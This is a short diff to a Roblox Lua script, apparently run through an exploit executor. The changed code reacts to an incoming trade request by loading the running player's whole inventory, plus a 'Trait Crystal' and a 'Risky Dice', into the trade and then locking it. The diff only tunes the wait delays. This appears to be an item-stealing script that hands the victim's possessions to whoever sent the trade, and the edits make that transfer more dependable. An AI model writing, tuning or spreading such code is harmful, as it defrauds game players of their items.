@@ -635,7 +635,7 @@ else
         local v_u_11 = game.ReplicatedStorage:WaitForChild("TradeRemotes")
         v_u_11.TradeUpdated.OnClientEvent:Connect(function(p27, p28)
             if p27 == "Requesting" then
-                wait(1)
+                wait(5)
                 for i,v in pairs(dectectinven()) do
                     wait(2)
                     local args = {
@@ -647,7 +647,7 @@ else
                     
                     letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
                 end
-                wait(1)
+                wait(3)
                 local args = {
                     [1] = "Trait Crystal",
                     [2] = "Items",
@@ -656,14 +656,13 @@ else
                 }
                 
                 letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
-                wait(2)
+                wait(3)
                 local args = {
                     [1] = "Risky Dice",
                     [2] = "Items",
                     [3] = inventory().Items["Risky Dice"],
                     [4] = true
                 }
-                
                 letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
                 wait(2)
                 getgenv().autolock = true
